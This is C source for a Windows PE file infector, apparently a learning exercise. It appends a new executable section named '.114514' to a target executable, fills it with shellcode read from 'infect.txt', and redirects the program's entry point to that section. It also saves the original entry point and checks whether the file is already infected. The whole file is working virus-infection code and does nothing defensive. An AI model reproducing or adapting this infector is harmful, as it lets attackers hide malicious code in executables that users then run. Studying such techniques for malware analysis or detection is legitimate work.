#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <winnt.h>

#define alig_up(a, s) ((a+s-1) & (~ (s-1)))

int rw_file(char filepath[], LPVOID buf, size_t _ElementSize, int cnt, int offset, int rwf, DWORD origin){
    HANDLE hFile = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER pLocalFile;  //  LARGE_INTEGER表示一个64位有符号整数
        pLocalFile.QuadPart = offset;
        DWORD dwReadedSize;
        DWORD dwResult = SetFilePointerEx(hFile, pLocalFile, &pLocalFile, origin);
        if (dwResult != INVALID_SET_FILE_POINTER) {
            if (rwf == 0){  // 读文件
                ReadFile(hFile, buf, _ElementSize * cnt, &dwReadedSize, NULL);
            }
            else{
                WriteFile(hFile, buf, _ElementSize * cnt, &dwReadedSize, NULL);   
            }
            CloseHandle(hFile);
            return 0;
        }
        CloseHandle(hFile);
    }
    return -1;
}

void add_virus_section(char filepath[]){
    IMAGE_DOS_HEADER DosHeader;
    IMAGE_NT_HEADERS NtHeaders;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER OptionalHeader;
    IMAGE_SECTION_HEADER StartSH; // 第一个节表项
    IMAGE_SECTION_HEADER VirusSH; // 用于存储新加的节表项
    IMAGE_SECTION_HEADER EndSH;   // 存储旧的节表项

    //! 读取并文件头信息，提取需要的三个节
    
    rw_file(filepath, &DosHeader, sizeof(IMAGE_DOS_HEADER), 1, 0, 0, FILE_BEGIN);
    rw_file(filepath,&NtHeaders, sizeof(IMAGE_NT_HEADERS), 1, DosHeader.e_lfanew, 0, FILE_BEGIN);

    FileHeader = NtHeaders.FileHeader;
    OptionalHeader = NtHeaders.OptionalHeader;

    int OldSN = FileHeader.NumberOfSections;
    int StartSO = DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS);  // 第一个节表项偏移
    int EndSO = DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (OldSN - 1) * sizeof(IMAGE_SECTION_HEADER);  // 最后一个节表项偏移
    printf("NtHeader Entry: 0x%0x, NumberOfSections: %d\n",DosHeader.e_lfanew, OldSN);

    rw_file(filepath, &StartSH, sizeof(IMAGE_SECTION_HEADER), 1, StartSO, 0, FILE_BEGIN);
    
    rw_file(filepath, &EndSH, sizeof(IMAGE_SECTION_HEADER), 1, EndSO, 0, FILE_BEGIN);

    //! 判断是否已经被感染
    if(!strcmp(EndSH.Name, ".114514")){
        printf("have been infected\n");
		return;
    }

    printf("Machine: %d\n", FileHeader.Machine);
    printf("Number of sections: %d\n", FileHeader.NumberOfSections);
    printf("Time date stamp: %d\n", FileHeader.TimeDateStamp);
    printf("Size of optional header: %d\n", OldSN);
    printf("Characteristics: %ld\n", FileHeader.Characteristics);
    printf("Magic: %d\n", OptionalHeader.Magic);
    printf("Address of entry point: 0x%0x\n", OptionalHeader.AddressOfEntryPoint);
    printf("Base of code: 0x%0x\n", OptionalHeader.BaseOfCode);
    printf("Base of data: 0x%0x\n", OptionalHeader.BaseOfData);
    printf("Image base: 0x%0x\n", OptionalHeader.ImageBase);
    printf("Section alignment: %d\n", OptionalHeader.SectionAlignment);
    printf("File alignment: %d\n", OptionalHeader.FileAlignment);
    printf("Size of image: %d\n", OptionalHeader.SizeOfImage);

    //! 添加节的准备工作：增加节数、保存后修改Entyrpoint
    NtHeaders.FileHeader.NumberOfSections += 1;
    DWORD OldAEP  = OptionalHeader.AddressOfEntryPoint;
    NtHeaders.OptionalHeader.AddressOfEntryPoint = EndSH.VirtualAddress + alig_up(EndSH.SizeOfRawData, 0x1000);
    printf("Old AddressOfEntryPoint: 0x%0x, New AddressOfEntryPoint: 0x%0x\n", OldAEP, NtHeaders.OptionalHeader.AddressOfEntryPoint);

    //! 读取病毒载荷，获得data及其大小
    char shellcode_file[100] = "infect.txt";
    HANDLE hshellcode_file = CreateFile(shellcode_file, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    int size;
    if (hshellcode_file != INVALID_HANDLE_VALUE) {
        size = (int)GetFileSize(hshellcode_file, NULL);
        CloseHandle(hshellcode_file);
    }
	INT8 data[alig_up(size, 0x200)];
    memset(data, 0x90, sizeof data);
    rw_file(shellcode_file, data, sizeof(INT8), size, 0, 0, FILE_BEGIN);
	printf("shellcode size: %0x", size);

    //! 初始化节
    VirusSH.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
    VirusSH.PointerToRawData = EndSH.PointerToRawData + EndSH.SizeOfRawData;
    VirusSH.VirtualAddress = NtHeaders.OptionalHeader.AddressOfEntryPoint;
    VirusSH.Misc.VirtualSize = size;
    VirusSH.SizeOfRawData = alig_up(size, 0x200);
    strcpy((char *)VirusSH.Name, ".114514");

    //! 回写修改后的相关数据
    NtHeaders.OptionalHeader.SizeOfImage += alig_up(size, 0x1000);
   	
    rw_file(filepath, &NtHeaders, sizeof(IMAGE_NT_HEADERS), 1, DosHeader.e_lfanew, 1, FILE_BEGIN);
    
    rw_file(filepath, &VirusSH, sizeof(IMAGE_SECTION_HEADER), 1, EndSO + sizeof(IMAGE_SECTION_HEADER), 1, FILE_BEGIN);
    
    rw_file(filepath, &OldAEP, sizeof(int), 1, StartSH.PointerToRawData - 4, 1, FILE_BEGIN);
    
    rw_file(filepath, data, sizeof(INT8), alig_up(size, 0x200), VirusSH.PointerToRawData, 1, FILE_BEGIN);
    printf("Successfully infect!\n");
    
}

int main () {
    char filepath[100] = ".\\test.exe";
    add_virus_section(filepath);
    return 0;
}